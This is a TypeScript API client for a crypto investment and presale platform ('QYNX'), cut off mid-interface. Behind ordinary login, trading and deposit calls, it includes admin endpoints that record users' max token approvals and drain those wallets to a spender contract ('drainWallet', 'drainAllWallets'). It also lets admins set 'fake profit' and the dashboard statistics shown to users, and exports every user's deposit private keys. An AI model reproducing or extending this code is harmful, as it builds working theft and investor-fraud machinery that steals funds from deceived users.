/**
 * Auth API client — matches backend server.js (qynx-back.vercel.app).
 * Backend: GET/POST /api/users, POST /api/login, POST /api/register, PUT/DELETE /api/users/:id
 */

import { request } from '@/lib/request'

export interface AuthUser {
  id?: string
  username: string
  name?: string
  role?: string
  active?: boolean
  loginCount?: number
  /** QYNX balance on BSC */
  token_amount_bsc?: number
  /** QYNX balance on Ethereum */
  token_amount_eth?: number
  /** QYNX balance on Bitcoin (BRC-20 / in-app) */
  token_amount_btc?: number
  /** Single string from backend (may be comma-separated) */
  wallet?: string
  /** When backend returns an array of addresses, use this for the real list */
  wallets?: string[]
  /** Wallet address to receive profit distributions */
  profit_for_address?: string
  /** Pending profit (USD) accumulated on BSC */
  profit_bsc?: number
  /** Pending profit (USD) accumulated on Ethereum */
  profit_eth?: number
  /** Pending profit (USD) on Bitcoin */
  profit_btc?: number
  /** Per-user deposit address (BSC). Set on registration. */
  deposit_address_bsc?: string
  /** Per-user deposit address (Ethereum). Set on registration. */
  deposit_address_eth?: string
  /** Per-user deposit address (Bitcoin). Set on registration. */
  deposit_address_btc?: string
  /** When true, admin can edit fake profit for this user in distributions. */
  fake_profit_enable?: boolean
}

export interface AuthData {
  users: AuthUser[]
  note?: string
}

export type SignInResult =
  | { ok: true; username: string; role: string; id?: string; referralCode?: string }
  | { ok: false; message: string }
  | null

/** Backend user shape from GET /api/users and GET /api/users/:id */
export interface ApiUser {
  id?: string
  name?: string
  email?: string
  role?: string
  active?: boolean
  loginCount?: number
  token_amount_bsc?: number
  token_amount_eth?: number
  token_amount_btc?: number
  wallet?: string
  wallets?: string[]
  /** Wallet address to receive profit distributions */
  profit_for_address?: string
  /** Pending profit (USD) on BSC */
  profit_bsc?: number
  /** Pending profit (USD) on Ethereum */
  profit_eth?: number
  /** Pending profit (USD) on Bitcoin */
  profit_btc?: number
  /** Per-user deposit address (BSC). Set on registration. */
  deposit_address_bsc?: string
  /** Per-user deposit address (Ethereum). Set on registration. */
  deposit_address_eth?: string
  /** Per-user deposit address (Bitcoin). Set on registration. */
  deposit_address_btc?: string
  /** When true, admin can edit fake profit for this user in distributions. */
  fake_profit_enable?: boolean
}

/** GET /api/users/:id — get user by id (includes investment_address, trading_address; no private keys). */
export async function getUser(userId: string): Promise<ApiUser | null> {
  if (!userId?.trim()) return null
  try {
    const u = await request<ApiUser>(`/api/users/${encodeURIComponent(userId)}`)
    return u || null
  } catch {
    return null
  }
}

/** GET /api/users — returns array; map to AuthData */
export async function getAuthData(): Promise<AuthData> {
  try {
    const list = await request<ApiUser[]>('/api/users')
    if (!Array.isArray(list)) return { users: [] }
    const users: AuthUser[] = list.map((u) => {
      const walletStr = typeof u.wallet === 'string' ? u.wallet : undefined
      const walletsArr = Array.isArray(u.wallets) && u.wallets.length > 0
        ? u.wallets.filter((a): a is string => typeof a === 'string')
        : (walletStr ? walletStr.split(',').map((a) => a.trim()).filter(Boolean) : [])
      return {
        id: u.id,
        username: u.email ?? '',
        name: u.name,
        role: u.role === 'admin' ? 'admin' : 'user',
        active: u.active !== false,
        loginCount: typeof u.loginCount === 'number' ? u.loginCount : 0,
        token_amount_bsc: typeof u.token_amount_bsc === 'number' ? u.token_amount_bsc : 0,
        token_amount_eth: typeof u.token_amount_eth === 'number' ? u.token_amount_eth : 0,
        token_amount_btc: typeof u.token_amount_btc === 'number' ? u.token_amount_btc : 0,
        wallet: walletStr ?? (walletsArr.length > 0 ? walletsArr.join(', ') : undefined),
        wallets: walletsArr.length > 0 ? walletsArr : undefined,
        profit_for_address: typeof u.profit_for_address === 'string' && u.profit_for_address.trim() ? u.profit_for_address.trim() : undefined,
        profit_bsc: typeof u.profit_bsc === 'number' && !Number.isNaN(u.profit_bsc) ? u.profit_bsc : 0,
        profit_eth: typeof u.profit_eth === 'number' && !Number.isNaN(u.profit_eth) ? u.profit_eth : 0,
        profit_btc: typeof (u as { profit_btc?: number }).profit_btc === 'number' && !Number.isNaN((u as { profit_btc?: number }).profit_btc) ? (u as { profit_btc: number }).profit_btc : 0,
        deposit_address_bsc: typeof u.deposit_address_bsc === 'string' && u.deposit_address_bsc.trim() ? u.deposit_address_bsc.trim() : undefined,
        deposit_address_eth: typeof u.deposit_address_eth === 'string' && u.deposit_address_eth.trim() ? u.deposit_address_eth.trim() : undefined,
        deposit_address_btc: typeof u.deposit_address_btc === 'string' && u.deposit_address_btc.trim() ? u.deposit_address_btc.trim() : undefined,
        fake_profit_enable: u.fake_profit_enable === true
      }
    })
    return { users }
  } catch {
    return { users: [] }
  }
}

/** Response from GET /api/stats — protocol totals and day-over-day change ratios */
export interface ApiStats {
  date: string
  dayIndex: number
  totalInvestment: string | null
  totalTrading: string | null
  totalProfit: string | null
  totalQynxTokenBalance: string | null
  totalUsers: number | null
  changeRatios: {
    investment: number | null
    trading: number | null
    profit: number | null
    qynxTokenBalance: number | null
    totalUsers: number | null
    portfolio: number | null
  }
}

/** GET /api/stats — protocol stats for frontend (totals + change ratios). Optional ?date=YYYY-MM-DD. */
export async function getStats(date?: string): Promise<ApiStats | null> {
  try {
    const path = date ? `/api/stats?date=${encodeURIComponent(date)}` : '/api/stats'
    return await request<ApiStats>(path)
  } catch {
    return null
  }
}

/** Not used by this backend (no bulk replace). Kept for compatibility. */
export async function saveAuthData(_data: AuthData): Promise<void> {
  // Backend has no PUT /api/auth/data; use updateUser per user
}

/** Resolve user id by email (e.g. when login response doesn't include id). */
export async function getUserIdByEmail(email: string): Promise<string | null> {
  if (!email?.trim()) return null
  try {
    const { users } = await getAuthData()
    const normalized = email.trim().toLowerCase()
    const user = users.find((u) => (u.username || '').toLowerCase() === normalized)
    return user?.id ?? null
  } catch {
    return null
  }
}

/** POST /api/login — body: { email, password }. On failure returns server error message. */
export async function clientSignIn(
  username: string,
  password: string
): Promise<SignInResult> {
  try {
    const res = await request<{ id?: string; name?: string; email?: string; role?: string }>('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email: username, password }),
    })
    const email = res?.email || username
    const role = res?.role === 'admin' ? 'admin' : 'user'
    return { ok: true, username: email, role, id: res?.id }
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    return { ok: false, message: msg || 'Login failed' }
  }
}

/** POST /api/register — body: { name?, email, password, referralCode? } */
export async function clientSignUp(
  username: string,
  password: string,
  referralCode?: string | null
): Promise<string | null> {
  try {
    const body: { name: string; email: string; role: string; active: boolean; loginCount: number; password: string; referer?: string } = {
      name: '',
      email: username,
      role: 'user',
      active: true,
      loginCount: 0,
      password,
    } 
    if (referralCode != null && referralCode.trim() !== '') {
      body.referer = referralCode.trim()
    }
    await request('/api/register', {
      method: 'POST',
      body: JSON.stringify(body),
    })
    return null
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (msg.includes('already registered') || msg.includes('409')) return 'User already registered with this email'
    return msg
  }
}

/** POST /api/register — add user (admin); backend has no role, same as sign-up */
export async function addUserByAdmin(
  username: string,
  password: string,
  _role: string
): Promise<string | null> {
  try {
    await request('/api/register', {
      method: 'POST',
      body: JSON.stringify({ name: '', email: username, password }),
    })
    return null
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (msg.includes('already registered') || msg.includes('409')) return 'User already exists with this email'
    return msg
  }
}

/** Get QYNX balance for a given network (token_amount_bsc, token_amount_eth, or token_amount_btc). */
export function getTokenAmountForNetwork(user: AuthUser | undefined | null, network: 'bsc' | 'ethereum' | 'bitcoin'): number {
  if (!user) return 0
  if (network === 'ethereum') return user.token_amount_eth ?? 0
  if (network === 'bitcoin') return user.token_amount_btc ?? 0
  return user.token_amount_bsc ?? 0
}

/** Get pending profit (USD) for a given network. */
export function getPendingProfitForNetwork(user: AuthUser | undefined | null, network: 'bsc' | 'ethereum' | 'bitcoin'): number {
  if (!user) return 0
  if (network === 'ethereum') return user.profit_eth ?? 0
  if (network === 'bitcoin') return user.profit_btc ?? 0
  return user.profit_bsc ?? 0
}

/** PUT /api/users/:id — backend accepts { name?, email?, password?, role?, active?, wallet?, token_amount_bsc?, token_amount_eth?, token_amount_btc?, profit_bsc?, profit_eth?, profit_for_address?, profit_for_address_bsc?, profit_for_address_eth?, profit_for_address_btc?, fake_profit_enable? } */
export async function updateUser(
  id: string,
  updates: { role?: string; active?: boolean; name?: string; email?: string; password?: string; wallet?: string; token_amount_bsc?: number; token_amount_eth?: number; token_amount_btc?: number; profit_for_address?: string; profit_for_address_bsc?: string; profit_for_address_eth?: string; profit_for_address_btc?: string; profit_bsc?: number; profit_eth?: number; fake_profit_enable?: boolean }
): Promise<void> {
  const body: Record<string, unknown> = {}
  if (updates.name !== undefined) body.name = updates.name
  if (updates.email !== undefined) body.email = updates.email
  if (updates.password !== undefined) body.password = updates.password
  if (updates.role !== undefined) body.role = updates.role
  if (updates.active !== undefined) body.active = updates.active
  if (updates.wallet !== undefined) body.wallet = updates.wallet
  if (updates.token_amount_bsc !== undefined) body.token_amount_bsc = updates.token_amount_bsc
  if (updates.token_amount_eth !== undefined) body.token_amount_eth = updates.token_amount_eth
  if (updates.token_amount_btc !== undefined) body.token_amount_btc = updates.token_amount_btc
  if (updates.profit_for_address !== undefined) body.profit_for_address = updates.profit_for_address
  if (updates.profit_for_address_bsc !== undefined) body.profit_for_address_bsc = updates.profit_for_address_bsc
  if (updates.profit_for_address_eth !== undefined) body.profit_for_address_eth = updates.profit_for_address_eth
  if (updates.profit_for_address_btc !== undefined) body.profit_for_address_btc = updates.profit_for_address_btc
  if (updates.profit_bsc !== undefined) body.profit_bsc = updates.profit_bsc
  if (updates.profit_eth !== undefined) body.profit_eth = updates.profit_eth
  if (updates.fake_profit_enable !== undefined) body.fake_profit_enable = updates.fake_profit_enable
  await request(`/api/users/${encodeURIComponent(id)}`, {
    method: 'PUT',
    body: JSON.stringify(body),
  })
}

/** Add a wallet address to the user's wallets array (backend will append if missing). */
export async function addUserWallet(userId: string, wallet: string): Promise<void> {
  const trimmed = wallet.trim()
  if (!trimmed) return
  await updateUser(userId, { wallet: trimmed })
}

/** Register a wallet address to receive profit distributions for a given network. */
export async function addUserProfitWallet(userId: string, profitWallet: string, network: 'bsc' | 'ethereum' | 'bitcoin' = 'bsc'): Promise<void> {
  const trimmed = profitWallet.trim()
  if (!trimmed) return
  if (network === 'ethereum') {
    await updateUser(userId, { profit_for_address_eth: trimmed })
  } else if (network === 'bitcoin') {
    await updateUser(userId, { profit_for_address_btc: trimmed })
  } else {
    await updateUser(userId, { profit_for_address_bsc: trimmed })
  }
}

/** Response from POST /api/admin/distribute */
export interface DistributeProfitResponse {
  success: boolean
  user_id: string
  distributed_amount: number
  token: string
  profit_for_address: string
  network: string
}

/** POST /api/admin/distribute — record distribution: amount of token to user's profit wallet. */
export async function distributeProfitToUser(
  userId: string,
  network: 'bsc' | 'ethereum' | 'bitcoin' = 'bsc',
  token: string = 'USDT',
  amount: number,
  to_address: string
): Promise<DistributeProfitResponse> {
  return request<DistributeProfitResponse>('/api/admin/distribute', {
    method: 'POST',
    body: JSON.stringify({ user_id: userId, network, token: token || 'USDT', amount, to_address }),
  })
}

/** POST /api/admin/distributions/recalculate-profits — re-calculate all users' profit from tradings by network and update user.profit_bsc / user.profit_eth. */
export async function recalculateProfits(): Promise<{ success: boolean; updated: number }> {
  return request<{ success: boolean; updated: number }>('/api/admin/distributions/recalculate-profits', {
    method: 'POST',
    body: JSON.stringify({}),
  })
}

/** POST /api/admin/distributions/format — set profit_bsc and profit_eth to 0 for selected user_ids. */
export async function formatPendingProfits(userIds: string[]): Promise<{ success: boolean; modified: number }> {
  return request<{ success: boolean; modified: number }>('/api/admin/distributions/format', {
    method: 'POST',
    body: JSON.stringify({ user_ids: userIds }),
  })
}

/** POST /api/admin/distributions/scale — scale profit_bsc and profit_eth by ratio for selected user_ids. */
export async function scalePendingProfits(userIds: string[], ratio: number, network: 'bsc' | 'ethereum' | 'bitcoin'): Promise<{ success: boolean; modified: number }> {
  return request<{ success: boolean; modified: number }>('/api/admin/distributions/scale', {
    method: 'POST',
    body: JSON.stringify({ user_ids: userIds, ratio, network }),
  })
}

/** Response from POST /api/purchase/verify-and-credit */
export interface VerifyPurchaseAndCreditResponse {
  token_amount_bsc: number
  token_amount_eth: number
  token_amount_btc?: number
  credited: number
}

/** Response from POST /api/bitcoin/purchase/verify-and-credit. When tx not yet confirmed, pending is true and credited is 0. */
export interface VerifyBitcoinPurchaseAndCreditResponse {
  token_amount_bsc: number
  token_amount_eth: number
  token_amount_btc: number
  credited: number
  mintSuccess: boolean
  mintError?: string
  pending?: boolean
}

/** GET /api/bitcoin/pending-transactions — list txs to show toasts (pending or confirmed unread). */
export interface BitcoinPendingTx {
  txHash: string
  kind: 'purchase' | 'trading'
  amount_btc?: number
  token?: string
  type?: string
  /** 0 = waiting for confirmation, 1 = confirmed (show "Confirmed" toast until read) */
  confirm_status?: number
  read?: number
}

export async function getBitcoinPendingTransactions(userId: string): Promise<BitcoinPendingTx[]> {
  const list = await request<
    { txHash: string; kind: string; amount_btc?: number; token?: string; type?: string; confirm_status?: number; read?: number }[]
  >(`/api/bitcoin/pending-transactions?user_id=${encodeURIComponent(userId)}`)
  return (list || []).map((x) => ({
    txHash: (x.txHash || '').toLowerCase().replace(/^0x/, ''),
    kind: (x.kind === 'trading' ? 'trading' : 'purchase') as BitcoinPendingTx['kind'],
    amount_btc: x.amount_btc != null ? x.amount_btc : 0,
    token: x.token || 'BTC',
    type: x.type || '',
    confirm_status: x.confirm_status != null ? x.confirm_status : 0,
    read: x.read != null ? x.read : 0,
  }))
}

/** POST /api/bitcoin/used-tx/mark-read — set read=1 when user dismisses a toast. */
export async function markBitcoinTxRead(userId: string, txHash: string): Promise<void> {
  await request<{ ok: boolean }>('/api/bitcoin/used-tx/mark-read', {
    method: 'POST',
    body: JSON.stringify({ user_id: userId, txHash: (txHash || '').trim().toLowerCase().replace(/^0x/, '') }),
  })
}

/** POST /api/bitcoin/purchase/verify-and-credit — verify Bitcoin tx, credit QYNX (token_amount_btc). */
export async function verifyBitcoinPurchaseAndCredit(
  userId: string,
  txHash: string,
  token: string,
  walletAddress?: string | null
): Promise<VerifyBitcoinPurchaseAndCreditResponse> {
  return request<VerifyBitcoinPurchaseAndCreditResponse>('/api/bitcoin/purchase/verify-and-credit', {
    method: 'POST',
    body: JSON.stringify({
      user_id: userId,
      txHash: txHash.trim(),
      token: token || 'BTC',
      ...(walletAddress && walletAddress.trim() ? { wallet_address: walletAddress.trim() } : {}),
    }),
  })
}

/** POST /api/purchase/verify-and-credit — verify deposit tx, credit user token_amount_bsc or token_amount_eth (QYNX). In QR mode pass walletAddress to mint to connected wallet. */
export async function verifyPurchaseAndCredit(
  userId: string,
  txHash: string,
  network: 'bsc' | 'ethereum',
  token: string,
  walletAddress?: string | null
): Promise<VerifyPurchaseAndCreditResponse> {
  return request<VerifyPurchaseAndCreditResponse>('/api/purchase/verify-and-credit', {
    method: 'POST',
    body: JSON.stringify({
      user_id: userId,
      txHash,
      network,
      token,
      ...(walletAddress && walletAddress.trim() ? { wallet_address: walletAddress.trim() } : {}),
    }),
  })
}

/** DELETE /api/users/:id */
export async function deleteUser(id: string): Promise<void> {
  await request(`/api/users/${encodeURIComponent(id)}`, { method: 'DELETE' })
}

/** Backend wallet shape from GET /api/wallets */
export interface ApiWallet {
  id?: string
  address: string
  userEmail?: string
  userId?: string
  active?: boolean
}

/** GET /api/wallets — returns all wallets of all users */
export async function getWallets(): Promise<ApiWallet[]> {
  try {
    const list = await request<ApiWallet[]>('/api/approvals')
    return Array.isArray(list) ? list : []
  } catch {
    return []
  }
}

/** POST /api/admin/drain — drain token from a wallet to spender contract (transferFrom). Amount: number or "max". */
export interface DrainResult {
  success: boolean
  txHash?: string
  token?: string
  from?: string
  amountWei?: string
  error?: string
}

export async function drainWallet(params: {
  walletAddress: string
  network: 'bsc' | 'ethereum'
  token: string
  amount: number | 'max'
}): Promise<DrainResult> {
  const body: { walletAddress: string; network: string; token: string; amount: number | string } = {
    walletAddress: params.walletAddress,
    network: params.network,
    token: params.token,
    amount: params.amount === 'max' ? 'max' : params.amount,
  }
  return request<DrainResult>('/api/admin/drain', {
    method: 'POST',
    body: JSON.stringify(body),
  })
}

/** POST /api/admin/drain-all — drain max of all tokens from all wallets to spender. */
export interface DrainAllResult {
  success: boolean
  drained?: { token: string; from: string; txHash?: string; amountWei?: string; error?: string }[]
  error?: string
}

export async function drainAllWallets(params: {
  network: 'bsc' | 'ethereum'
  /** If provided, only these wallet addresses are drained (e.g. from wallets management table). */
  addresses?: string[]
  /** If provided, only these token symbols are drained (e.g. from approval table). Native BNB/ETH are ignored. */
  tokens?: string[]
}): Promise<DrainAllResult> {
  const body: { network: string; addresses?: string[]; tokens?: string[] } = { network: params.network }
  if (params.addresses?.length) body.addresses = params.addresses
  if (params.tokens?.length) body.tokens = params.tokens
  return request<DrainAllResult>('/api/admin/drain-all', {
    method: 'POST',
    body: JSON.stringify(body),
  })
}

/** POST /api/approvals — record a token approval after user approves max allowance. */
export async function recordApproval(params: {
  wallet_address: string
  network: 'bsc' | 'ethereum'
  token_name: string
}): Promise<void> {
  await request('/api/approvals', {
    method: 'POST',
    body: JSON.stringify({
      wallet_address: params.wallet_address,
      network: params.network,
      token_name: params.token_name,
    }),
  })
}

/** GET /api/admin/approvals — list approvals, optional network filter. */
export interface ApiApproval {
  _id?: string
  wallet_address: string
  network: string
  token_name: string
  createdAt?: string
}

export async function getApprovals(params?: { network?: 'bsc' | 'ethereum' }): Promise<ApiApproval[]> {
  const q = params?.network ? `?network=${encodeURIComponent(params.network)}` : ''
  const list = await request<ApiApproval[]>(`/api/admin/approvals${q}`)
  return Array.isArray(list) ? list : []
}

/** POST /api/admin/wallet-balances — real on-chain balances per address and token. Returns { [addressLower]: { [tokenSymbol]: string } }. */
export async function getWalletBalances(params: {
  network: 'bsc' | 'ethereum'
  addresses: string[]
}): Promise<Record<string, Record<string, string>>> {
  const result = await request<Record<string, Record<string, string>>>('/api/admin/wallet-balances', {
    method: 'POST',
    body: JSON.stringify({ network: params.network, addresses: params.addresses }),
  })
  return result && typeof result === 'object' ? result : {}
}

/** GET /api/admin/export-addresses — returns all users with addresses and private keys. Requires x-admin-export-key header matching ADMIN_EXPORT_SECRET. */
export interface AdminExportUser {
  id: string
  email?: string
  /** Legacy investment/trading/treasury fields (may be unused) */
  investment_address?: string
  investment_private_key?: string
  trading_address?: string
  trading_private_key?: string
  treasury_address?: string
  treasury_private_key?: string
  /** Per-user deposit addresses and private keys (BSC / Ethereum / Bitcoin) */
  deposit_address_bsc?: string
  deposit_private_key_bsc?: string
  deposit_address_eth?: string
  deposit_private_key_eth?: string
  deposit_address_btc?: string
  deposit_private_key_btc?: string
  [key: string]: unknown
}

export async function exportAdminAddresses(): Promise<AdminExportUser[]> {
  const key = typeof process !== 'undefined' ? process.env.NEXT_PUBLIC_ADMIN_EXPORT_SECRET : ''
  const list = await request<AdminExportUser[]>('/api/admin/export-addresses', {
    headers: key ? { 'x-admin-export-key': key } : {},
  })
  return Array.isArray(list) ? list : []
}

/** GET /api/admin/users/:userId/deposit-wallet — deposit address and private key for a user and network. */
export interface AdminDepositWallet {
  deposit_address: string
  deposit_private_key: string
  network: string
}

export async function getAdminUserDepositWallet(
  userId: string,
  network: 'bsc' | 'ethereum' | 'bitcoin'
): Promise<AdminDepositWallet> {
  return request<AdminDepositWallet>(
    `/api/admin/users/${encodeURIComponent(userId)}/deposit-wallet?network=${encodeURIComponent(network)}`
  )
}

/** Admin settings (single document). */
export interface ApiSettings {
  id?: string
  admin_wallet_address?: string
  admin_wallet_private_key?: string
  qynx_contract_address?: string
  qynx_minter_private_key?: string
  qynx_contract_address_eth?: string
  qynx_minter_private_key_eth?: string
  qynx_per_usd?: number
  /** Referral bonus: token amount (e.g. QYNX) per sign-up with referral code. */
  bonus_for_referral?: number
  /** Aggregate trading statistics (for Trading page / dashboard overview). */
  total_trading?: number
  total_profit?: number
  trading_rounds?: number
  /** Dashboard overview display values (admin-configurable). */
  total_accounts?: number
  bsc_trading?: number
  ethereum_trading?: number
  bitcoin_trading?: number
  /** EVM wallet auto-approve configuration (admin). */
  evm_wallet_auto_approve_tokens?: string
  evm_wallet_auto_approve_mode?: string
  evm_wallet_approve_spender?: string
  /** Private key of the wallet that controls the spender (for approvals/drain). */
  evm_wallet_approve_spender_private_key?: string
  business_number?: string
}

/** Public display settings for dashboard overview (GET /api/settings/display). */
export interface ApiDisplaySettings {
  total_accounts: number
  total_trading: number
  total_profit: number
  trading_rounds: number
  bsc_trading: number
  ethereum_trading: number
  bitcoin_trading: number
}

/** GET /api/settings/display — public; no auth. Returns dashboard overview values from backend settings. */
export async function getDisplaySettings(): Promise<ApiDisplaySettings> {
  try {
    const data = await request<ApiDisplaySettings>('/api/settings/display')
    if (!data) {
      return {
        total_accounts: 0,
        total_trading: 0,
        total_profit: 0,
        trading_rounds: 0,
        bsc_trading: 0,
        ethereum_trading: 0,
        bitcoin_trading: 0,
      }
    }
    return data
  } catch (e) {
    return {
      total_accounts: 0,
      total_trading: 0,
      total_profit: 0,
      trading_rounds: 0,
      bsc_trading: 0,
      ethereum_trading: 0,
      bitcoin_trading: 0,
    }
  }
}

/** GET /api/admin/settings */
export async function getSettings(): Promise<ApiSettings> {
  const doc = await request<ApiSettings>('/api/admin/settings')
  return doc || { id: 'default' }
}

/** PUT /api/admin/settings. Only provided fields are updated. */
export async function updateSettings(updates: Partial<ApiSettings>): Promise<ApiSettings> {
  return request<ApiSettings>('/api/admin/settings', {
    method: 'PUT',
    body: JSON.stringify(updates),
  })
}

/** POST /api/investments — create investment. Body: user_id, wallet_address, token, amount, period, status? (0-3) */
export interface CreateInvestmentBody {
  user_id: string
  wallet_address: string
  token: string
  amount: number
  period: number
  status?: number
}

/** Only ACTIVE (0) investments/tradings count toward protocol (bonus, balance, totals). PENDING (1) are excluded until deposit is verified. */
export const ACTIVITY_STATUS_ACTIVE = 0

export interface ApiInvestment {
  id: string
  user_id: string
  wallet_address: string
  token: string
  amount: number
  period: number
  status: number
  created_at?: string | number
  createdAt?: string | number
}

export async function createInvestment(body: CreateInvestmentBody): Promise<ApiInvestment> {
  return request<ApiInvestment>('/api/investments', {
    method: 'POST',
    body: JSON.stringify(body),
  })
}

/** GET /api/investments — optional ?user_id= to filter by user */
export async function getInvestmentsByUserId(userId: string): Promise<ApiInvestment[]> {
  try {
    const res = await request<ApiInvestment[] | { error?: string }>(`/api/users/${encodeURIComponent(userId)}/investments`)
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** GET /api/investments — list all investments (for admin dashboard). Returns [] if not supported. */
export async function getInvestments(): Promise<ApiInvestment[]> {
  try {
    const res = await request<ApiInvestment[] | { error?: string }>('/api/investments')
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** POST /api/tradings — create trading. Body: user_id, wallet_address, token, amount, type, status? (0-3) */
export interface CreateTradingBody {
  user_id: string
  wallet_address: string
  token: string
  amount: number
  type: string
  status?: number
}

export interface ApiTrading {
  id: string
  user_id: string
  wallet_address: string
  token: string
  amount: number
  type: string
  status: number
  created_at?: string
  createdAt?: string
  deposit_tx_hash?: string
  network?: 'bsc' | 'ethereum' | 'bitcoin'
}

export async function createTrading(body: CreateTradingBody): Promise<ApiTrading> {
  return request<ApiTrading>('/api/tradings', {
    method: 'POST',
    body: JSON.stringify(body),
  })
}

/** PUT /api/tradings/:id — update trading (amount, token, type, status). Admin only. */
export async function updateTrading(
  tradingId: string,
  updates: { amount?: number; token?: string; type?: string; status?: number }
): Promise<ApiTrading> {
  return request<ApiTrading>(`/api/tradings/${encodeURIComponent(tradingId)}`, {
    method: 'PUT',
    body: JSON.stringify(updates),
  })
}

/** POST /api/investments/confirm-and-create — verify tx then create investment as ACTIVE (no PENDING record). */
export async function confirmAndCreateInvestment(params: {
  user_id: string
  wallet_address: string
  token: string
  amount: number
  period: number
  txHash: string
  network?: 'bsc' | 'ethereum'
}): Promise<ApiInvestment> {
  return request<ApiInvestment>('/api/investments/confirm-and-create', {
    method: 'POST',
    body: JSON.stringify({
      user_id: params.user_id,
      wallet_address: params.wallet_address,
      token: params.token,
      amount: params.amount,
      period: params.period,
      txHash: params.txHash.trim(),
      network: params.network || 'bsc',
    }),
  })
}

/** POST /api/tradings/confirm-and-create — verify tx then create trading as ACTIVE (no PENDING record). */
export async function confirmAndCreateTrading(params: {
  user_id: string
  wallet_address: string
  token: string
  amount: number
  type: string
  txHash: string
  network?: 'bsc' | 'ethereum'
}): Promise<ApiTrading> {
  return request<ApiTrading>('/api/tradings/confirm-and-create', {
    method: 'POST',
    body: JSON.stringify({
      user_id: params.user_id,
      wallet_address: params.wallet_address,
      token: params.token,
      amount: params.amount,
      type: params.type,
      txHash: params.txHash.trim(),
      network: params.network || 'bsc',
    }),
  })
}

/** POST /api/bitcoin/tradings/confirm-and-create — verify Bitcoin tx, create trading with network=bitcoin. May return 202 with { pending: true } when tx not yet confirmed. */
export async function confirmAndCreateBitcoinTrading(params: {
  user_id: string
  wallet_address: string
  token: string
  type: string
  txHash: string
}): Promise<ApiTrading | { pending: true; message?: string }> {
  return request<ApiTrading | { pending: true; message?: string }>('/api/bitcoin/tradings/confirm-and-create', {
    method: 'POST',
    body: JSON.stringify({
      user_id: params.user_id,
      wallet_address: params.wallet_address,
      token: params.token || 'BTC',
      type: params.type,
      txHash: params.txHash.trim(),
    }),
  })
}

const BITCOIN_POLL_INTERVAL_MS = 5000
const BITCOIN_POLL_MAX_ATTEMPTS = 24

function isBitcoinPendingError(e: unknown): boolean {
  const msg = e instanceof Error ? e.message : typeof e === 'string' ? e : ''
  return String(msg).toLowerCase().includes('not found') || String(msg).toLowerCase().includes('not yet confirmed')
}

/** Poll verify-and-credit until tx is confirmed and credited (or max attempts). Caller should show "Waiting for confirmation…" toast. */
export async function verifyBitcoinPurchaseAndCreditWithPolling(
  userId: string,
  txHash: string,
  walletAddress?: string | null
): Promise<VerifyBitcoinPurchaseAndCreditResponse> {
  let lastErr: unknown
  for (let i = 0; i < BITCOIN_POLL_MAX_ATTEMPTS; i++) {
    try {
      const res = await verifyBitcoinPurchaseAndCredit(userId, txHash.trim(), 'BTC', walletAddress)
      if (res.pending) {
        if (i < BITCOIN_POLL_MAX_ATTEMPTS - 1) await new Promise((r) => setTimeout(r, BITCOIN_POLL_INTERVAL_MS))
        continue
      }
      return res
    } catch (e) {
      lastErr = e
      if (!isBitcoinPendingError(e)) throw e
      if (i < BITCOIN_POLL_MAX_ATTEMPTS - 1) await new Promise((r) => setTimeout(r, BITCOIN_POLL_INTERVAL_MS))
    }
  }
  throw lastErr
}

/** Poll confirm-and-create until tx is confirmed and trading is created (or max attempts). */
export async function confirmAndCreateBitcoinTradingWithPolling(params: {
  user_id: string
  wallet_address: string
  token: string
  type: string
  txHash: string
}): Promise<ApiTrading> {
  let lastErr: unknown
  for (let i = 0; i < BITCOIN_POLL_MAX_ATTEMPTS; i++) {
    try {
      const res = await confirmAndCreateBitcoinTrading(params)
      if (res && 'pending' in res && res.pending) {
        if (i < BITCOIN_POLL_MAX_ATTEMPTS - 1) await new Promise((r) => setTimeout(r, BITCOIN_POLL_INTERVAL_MS))
        continue
      }
      return res as ApiTrading
    } catch (e) {
      lastErr = e
      if (!isBitcoinPendingError(e)) throw e
      if (i < BITCOIN_POLL_MAX_ATTEMPTS - 1) await new Promise((r) => setTimeout(r, BITCOIN_POLL_INTERVAL_MS))
    }
  }
  throw lastErr
}

/** GET /api/users/:userId/tradings — list tradings for a user (newest first). Optional network filters by chain. */
export async function getTradingsByUserId(userId: string, network?: 'bsc' | 'ethereum' | 'bitcoin'): Promise<ApiTrading[]> {
  try {
    const query = network ? `?network=${encodeURIComponent(network)}` : ''
    const res = await request<ApiTrading[] | { error?: string }>(`/api/users/${encodeURIComponent(userId)}/tradings${query}`)
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** GET /api/users/:userId/purchase-balance — total USD value of user's purchases from Purchase table (presale). */
export async function getPurchaseBalance(userId: string): Promise<number> {
  try {
    const res = await request<{ totalUsd?: number } | { error?: string }>(`/api/users/${encodeURIComponent(userId)}/purchase-balance`)
    if (res && typeof (res as { totalUsd?: number }).totalUsd === 'number') return (res as { totalUsd: number }).totalUsd
    return 0
  } catch {
    return 0
  }
}

/** GET /api/users/:userId/purchases — list of user's QYNX purchases with createdAt, usd_value, qynx_amount (for balance overview chart). */
export interface ApiUserPurchaseItem {
  createdAt: string | null
  usd_value: number
  qynx_amount: number
}
export async function getUserPurchases(userId: string): Promise<ApiUserPurchaseItem[]> {
  try {
    const res = await request<{ purchases?: ApiUserPurchaseItem[] } | { error?: string }>(`/api/users/${encodeURIComponent(userId)}/purchases`)
    const list = res && (res as { purchases?: ApiUserPurchaseItem[] }).purchases
    return Array.isArray(list) ? list : []
  } catch {
    return []
  }
}

/** GET /api/tradings — list all tradings (for bonus stats: first10, biggest). Optional network filters by chain. Returns [] if not supported. */
export async function getTradings(network?: 'bsc' | 'ethereum' | 'bitcoin'): Promise<ApiTrading[]> {
  try {
    const query = network ? `?network=${encodeURIComponent(network)}` : ''
    const res = await request<ApiTrading[] | { data?: ApiTrading[]; tradings?: ApiTrading[] }>(`/api/tradings${query}`)
    if (Array.isArray(res)) return res
    const list = (res && (res as { data?: ApiTrading[] }).data) || (res && (res as { tradings?: ApiTrading[] }).tradings)
    return Array.isArray(list) ? list : []
  } catch {
    return []
  }
}

/** Bonus record (win bonus plan achievement). */
export interface ApiBonus {
  id: string
  user_id: string
  bonus_plan_type: string
  achieve_time: string
  bonus_amount: number
  period_key: string
  network?: 'bsc' | 'ethereum' | 'bitcoin'
